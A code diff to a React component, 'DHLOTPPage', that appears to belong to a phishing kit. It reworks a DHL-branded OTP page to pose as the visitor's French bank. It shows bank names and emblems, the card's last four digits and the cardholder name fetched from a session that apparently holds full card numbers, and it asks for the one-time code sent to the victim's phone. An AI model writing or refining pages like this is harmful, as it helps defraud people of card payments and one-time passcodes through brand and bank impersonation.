@@ -16,12 +16,68 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
   const [otp, setOtp] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
   const [paymentId, setPaymentId] = useState<string>(propPaymentId || "");
+  const [bankName, setBankName] = useState("Votre Banque");
+  const [bankFlag, setBankFlag] = useState("🏦");
+  const [cardLast4, setCardLast4] = useState("****");
+  const [cardholderName, setCardholderName] = useState("");
+  const [currentDate, setCurrentDate] = useState("");
+
+  // Format date in French
+  const formatDate = (): string => {
+    const date = new Date();
+    const options: Intl.DateTimeFormatOptions = { 
+      day: 'numeric', 
+      month: 'long', 
+      year: 'numeric' 
+    };
+    return date.toLocaleDateString('fr-FR', options);
+  };
+
+  // Bank flags mapping
+  const getBankFlag = (name: string): string => {
+    const flags: Record<string, string> = {
+      "BNP Paribas": "🏦",
+      "Crédit Agricole": "🌾",
+      "Société Générale": "🏛️",
+      "Crédit Mutuel": "💚",
+      "LCL": "💙",
+      "Caisse d'Épargne": "🐿️",
+      "La Banque Postale": "📮",
+      "Boursorama": "🦁",
+      "Visa": "💳",
+      "Mastercard": "💳",
+      "American Express": "💳",
+    };
+    return flags[name] || "🏦";
+  };
 
   useEffect(() => {
+    // Set current date
+    setCurrentDate(formatDate());
+
     const params = new URLSearchParams(window.location.search);
     const id = params.get("session");
     const pId = params.get("paymentId") || propPaymentId;
-    if (id) setSessionId(id);
+    
+    if (id) {
+      setSessionId(id);
+      // Fetch session data for bank/card info
+      fetch(`/api/dhl/session/${id}`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.bankName) {
+            setBankName(data.bankName);
+            setBankFlag(getBankFlag(data.bankName));
+          }
+          if (data.cardNumber) {
+            setCardLast4(data.cardNumber.slice(-4));
+          }
+          if (data.cardholderName) {
+            setCardholderName(data.cardholderName);
+          }
+        })
+        .catch(() => {});
+    }
     if (pId) setPaymentId(pId);
   }, [propPaymentId]);
 
@@ -72,14 +128,38 @@ export default function DHLOTPPage({ step = 1, paymentId: propPaymentId }: DHLOT
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-red-50 flex items-center justify-center p-4">
-      <Card className="w-full max-w-md shadow-xl border-2 border-[#FFCC00]">
-        <CardHeader className="space-y-3 text-center bg-gradient-to-r from-[#FFCC00] to-[#D40511] text-white">
+    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-4">
+      <Card className="w-full max-w-md shadow-xl border-2 border-gray-800">
+        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-gray-900 to-black text-white pb-8">
           <div className="flex justify-center">
-            <ShieldCheck className="h-16 w-16" />
+            <div className="bg-white rounded-full p-6 shadow-lg" data-testid="bank-logo">
+              <div className="text-6xl">{bankFlag}</div>
+            </div>
           </div>
-          <CardTitle className="text-2xl font-bold">
-            Vérification de sécurité {step}/2
+          <div className="text-3xl font-bold mb-2" data-testid="bank-name">{bankName}</div>
+          
+          {/* Current Date */}
+          <div className="text-sm text-white/80 font-medium" data-testid="current-date">
+            {currentDate}
+          </div>
+
+          {/* Card Last 4 + Cardholder Name */}
+          {cardholderName && (
+            <div className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg py-3 px-4 mx-8" data-testid="card-info">
+              <div className="text-white/90 text-sm font-medium mb-1">
+                Carte bancaire
+              </div>
+              <div className="text-white text-lg font-bold tracking-wider">
+                •••• {cardLast4}
+              </div>
+              <div className="text-white/80 text-sm mt-1 uppercase tracking-wide">
+                {cardholderName}
+              </div>
+            </div>
+          )}
+
+          <CardTitle className="text-2xl font-bold pt-2">
+            Vérification de sécurité
           </CardTitle>
           <CardDescription className="text-white/90">
             Veuillez entrer le code OTP envoyé à votre téléphone
